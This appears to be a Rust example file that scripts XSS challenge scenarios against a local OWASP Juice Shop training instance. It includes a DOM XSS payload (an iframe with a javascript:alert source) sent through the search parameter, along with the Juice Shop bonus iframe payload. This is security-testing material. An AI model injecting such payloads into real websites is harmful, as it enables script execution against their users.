//! XSS (Cross-Site Scripting) Scenarios
//!
//! Tests for DOM-based, reflected, and stored XSS.
//!
//! Run with: cargo run --example juice_shop_xss

use rectitude::prelude::*;
use std::sync::Arc;

const BASE_URL: &str = "http://localhost:3000";

#[tokio::main]
async fn main() -> anyhow::Result<()> {
    println!("=== XSS Scenarios ===\n");

    let results = vec![
        dom_xss().await?,
        bonus_payload().await?,
        privacy_policy().await?,
    ];

    let passed = results.iter().filter(|r| r.success).count();
    println!("\n=== Summary: {}/{} passed ===", passed, results.len());

    Ok(())
}

// ============ DOM-based XSS ============

async fn dom_xss() -> Result<ScenarioResult> {
    Scenario::new("DOM XSS - Search Parameter")
        .base_url(BASE_URL)
        .tags(&["xss", "dom-xss", "difficulty-1"])
        .step(
            "Inject XSS via search",
            |ctx: Arc<ScenarioContext>| async move {
                // DOM XSS via hash fragment in search
                let payload = "<iframe src=\"javascript:alert('xss')\">";
                let resp = ctx.get(&format!("/#/search?q={}", payload)).send().await?;

                resp.expect_success()?;
                ok_with("XSS payload delivered via search")
            },
        )
        .run()
        .await
}

async fn bonus_payload() -> Result<ScenarioResult> {
    Scenario::new("Bonus Payload - SoundCloud Iframe")
        .base_url(BASE_URL)
        .tags(&["xss", "bonus", "difficulty-1"])
        .step("Use SoundCloud iframe payload", |ctx: Arc<ScenarioContext>| async move {
            // Special iframe payload that triggers bonus challenge
            let payload = r#"<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true&show_reposts=false&show_teaser=true"></iframe>"#;

            let resp = ctx
                .get(&format!("/#/search?q={}", url_encode(payload)))
                .send()
                .await?;

            resp.expect_success()?;
            ok_with("Bonus XSS payload delivered")
        })
        .run()
        .await
}

// ============ Miscellaneous ============

async fn privacy_policy() -> Result<ScenarioResult> {
    Scenario::new("Privacy Policy - Hidden Page")
        .base_url(BASE_URL)
        .tags(&["misc", "hidden-page", "difficulty-1"])
        .step(
            "Access privacy policy",
            |ctx: Arc<ScenarioContext>| async move {
                let resp = ctx.get("/#/privacy-security/privacy-policy").send().await?;
                resp.expect_success()?;
                ok_with("Privacy policy accessed")
            },
        )
        .run()
        .await
}
